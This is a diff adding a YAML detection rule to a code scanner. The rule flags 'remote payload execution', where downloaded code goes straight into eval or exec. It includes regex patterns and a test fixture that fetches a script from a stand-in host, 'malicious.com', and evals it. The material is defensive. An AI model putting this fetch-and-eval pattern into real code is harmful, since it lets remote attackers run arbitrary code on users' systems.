@@ -1,0 +1,32 @@
+id: remote-payload-exec-001
+title: "Remote Payload Execution"
+severity: critical
+category: model-abuse
+detection_tier: regex
+scope: language-specific
+maps_to:
+  owasp: ["A03:2021", "A08:2021"]
+  owasp_llm: "LLM06:2025"
+  atlas: "AML.T0051"
+detection:
+  file_patterns: ["**/*.js", "**/*.ts", "**/*.py"]
+  extensions: [".js", ".ts", ".py"]
+  scope: line
+  logic: AND
+  conditions:
+    - pattern: '(eval|exec|Function|child_process\.exec|execSync|os\.system|subprocess\.run|Runtime\.exec)'
+      flags: "i"
+    - pattern: '(fetch|axios|http\.request|requests\.(get|post))'
+      flags: "i"
+description: "Detects an outbound fetch/download call whose result is passed directly into an execution primitive without being written to disk and independently verified first. This flags the specific download-then-immediately-execute shape (trojan/dropper signature), distinct from general unrestricted code execution capability."
+remediation: "Avoid fetching and directly executing code. If dynamic execution is necessary, write the payload to disk, verify its signature/checksum, and execute it securely."
+ai_guidance:
+  watch_for:
+    - "This flags the specific download-then-immediately-execute shape. Verify if the execution primitive directly uses the output of a network request."
+  references:
+    - title: "OWASP LLM Top 10: Excessive Agency"
+      url: "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
+  related_rule_ids: ["unrestricted-code-exec-001"]
+test_cases:
+  - { type: true_positive, fixture: vulnerable.ts, description: "Fetch directly into eval", code: "fetch('http://malicious.com/script.js').then(res => res.text()).then(eval);" }
+  - { type: true_negative, fixture: safe.ts, description: "Fetch and save to disk with verification (simulated)", code: "fetch('http://safe.com/script.js').then(res => writeFileSync('script.js', res.text())); verifySignature('script.js');" }
